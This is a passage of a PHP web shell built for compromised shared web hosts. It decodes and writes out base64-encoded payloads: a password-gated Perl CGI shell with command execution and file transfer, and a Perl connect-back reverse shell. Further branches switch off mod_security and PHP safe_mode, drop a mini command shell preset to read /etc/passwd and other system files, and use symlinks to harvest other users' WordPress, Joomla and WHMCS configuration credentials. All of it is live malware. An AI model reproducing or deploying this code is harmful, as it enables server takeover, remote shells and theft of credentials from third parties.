LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';
    $file = fopen("izo.cin", "w+");
    $write = fwrite($file, base64_decode($cgishellizocin));
    fclose($file);
    chmod("izo.cin", 0755);
    $netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';
    $file = fopen("dc.pl", "w+");
    $write = fwrite($file, base64_decode($netcatshell));
    fclose($file);
    chmod("dc.pl", 0755);
    echo "&lt;iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0&gt;&lt;/iframe&gt; 

 
 &lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'phpini')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;Safe Mode php.ini&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";
    mkdir('safeof', 0755);
    chdir('safeof');
    $kokdosya = ".htaccess";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Dosya a??lamad?!");
    $metin = "&lt;IfModule mod_security.c&gt;
    SecFilterEngine Off
    SecFilterScanPOST Off
&lt;/IfModule&gt;";
    fwrite($dosya, $metin);
    fclose($dosya);
    $kokdosya = "php.ini";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Dosya a??lamad?!");
    $metin = "safe_mode          =       OFF
disable_functions       =            NONE";
    fwrite($dosya, $metin);
    fclose($dosya);
    $mini = 'DQo8P3BocA0KZWNobyAiPGI+PGZvbnQgY29sb3I9Ymx1ZT5Db21tYW5kIFNoZWxsPC9mb250PjwvYj48YnI+IjsNCnByaW50X3IoJw0KPHByZT4NCjxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPg0KPGI+PGZvbnQgY29sb3I9Ymx1ZT48Yj48Zm9udCBjb2xvcj0iYmx1ZSI+Q29tbWFuZCAgOj0pIDwvZm9udD48L2ZvbnQ+PC9iPjxpbnB1dCBuYW1lPSJiYWJhIiB0eXBlPSJ0ZXh0IiBjbGFzcz0iaW5wdXR6IiBzaXplPSIzNCI+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImlucHV0emJ1dCIgdmFsdWU9IkdvIj4NCjwvZm9ybT4NCjxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPjxzdHJvbmc+PGI+PGZvbnQgY29sb3I9ImJsdWUiPk1lbnUgQnlwYXNzICA6PSkgIDwvZm9udD48L3N0cm9uZz48c2VsZWN0IG5hbWU9ImxpejAiIHNpemU9IjEiIGNsYXNzPSJpbnB1dHoiPg0KPG9wdGlvbiB2YWx1ZT0iY2F0IC9ldGMvcGFzc3dkIj4vZXRjL3Bhc3N3ZDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0ibmV0c3RhdCAtYW4gfCBncmVwIC1pIGxpc3RlbiI+bmV0c3RhdDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iY2F0IC92YXIvY3BhbmVsL2FjY291bnRpbmcubG9nIj4vdmFyL2NwYW5lbC9hY2NvdW50aW5nLmxvZzwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iY2F0IC9ldGMvc3lzbG9nLmNvbmYiPi9ldGMvc3lzbG9nLmNvbmY8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9ImNhdCAvZXRjL2hvc3RzIj4vZXRjL2hvc3RzPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJjYXQgL2V0Yy9uYW1lZC5jb25mIj4vZXRjL25hbWVkLmNvbmY8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9ImNhdCAvZXRjL2h0dHBkL2NvbmYvaHR0cGQuY29uZiI+L2V0Yy9odHRwZC9jb25mL2h0dHBkLmNvbmY8L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaW5wdXR6YnV0IiB2YWx1ZT0iRyZvdW1sOyI+DQo8L2Zvcm0+DQo8L3ByZT4NCicpOw0KaW5pX3Jlc3RvcmUoInNhZmVfbW9kZSIpOw0KaW5pX3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOw0KJGxpejA9c2hlbGxfZXhlYygkX1BPU1RbYmFiYV0pOyANCiRsaXowemltPXNoZWxsX2V4ZWMoJF9QT1NUW2xpejBdKTsgDQokdWlkPXNoZWxsX2V4ZWMoJ2lkJyk7DQokc2VydmVyPXNoZWxsX2V4ZWMoJ3VuYW1lIC1hJyk7DQplY2hvICI8cHJlPjxoND4iOw0KDQplY2hvICRsaXowOw0KZWNobyAkbGl6MHppbTsNCmVjaG8gIjwvaDQ+PC9wcmU+PGNlbnRlci8+IjsNCj8+
';
    $file = fopen("safe.php", "w+");
    $write = fwrite($file, base64_decode($mini));
    fclose($file);
    echo "&lt;iframe src=safeof/safe.php width=97% height=70% frameborder=0&gt;&lt;/iframe&gt; 

  
&lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'config')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[ Config Shell Priv8 SCR ]==--+&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
    mkdir('config', 0755);
    chdir('config');
    $kokdosya = ".htaccess";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Error cuyy!");
    $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
		
AddType application/x-httpd-cgi .cpc

AddHandler cgi-script .izo
AddHandler cgi-script .izo";
    fwrite($dosya, $metin);
    fclose($dosya);
    $configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPlByaXY4IFNDUjwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IHRhaG9tYSwgdmVyZGFuYSwgQXJpYWw7DQogZm9udC1zaXplOiBtZWRpdW07DQogY29sb3I6ICNGRkZGRkY7DQogYmFja2dyb3VuZC1jb2xvcjogIzY2NjY2NjsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQoka29sYT0kbXNyLiIvIi4kdXNlcjsNCiRrb2xhPX5zL1xuLy9nOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYSAtIGhvbWUudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcyAtIHdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywka29sYS4nLSBDIE0gRiAudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGtvbGEuJy0gQyBNIEYgLSBmb3J1bS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGtvbGEuJy0gTXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywka29sYS4nLSBNeUJCIC0gZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nLSBPdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywka29sYS4nLSBCYWxpdGJhbmcudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWNsaWVudHMudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmdzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSB3aG1jcyAtIHdobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gd2htIC0gd2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLSBWQnVsbGV0aW4gLSBmb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGtvbGEuJwktIFBocEJCIC0gZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSB3aG1jIC0gd2htYy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJwktIHdobWNzMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nCS1tYW5nZXdobWNzLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nCS1teXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictb3Njb21tZXJjZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2FsZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd3dvcmRwcmVzcyAtIHdwIC0gYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBiZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLXdvcmRwcmVzcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRrb2xhLictIHdvcmRwcmVzcyAtIHNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSB0ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhIC0gam9vbWxhIC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSBqb29tbGEgLSBwcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gam9vLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictIGpvb21sYSAtIGNtcy50eHQnKTsNCiBzeW1saW5rKCcvaG9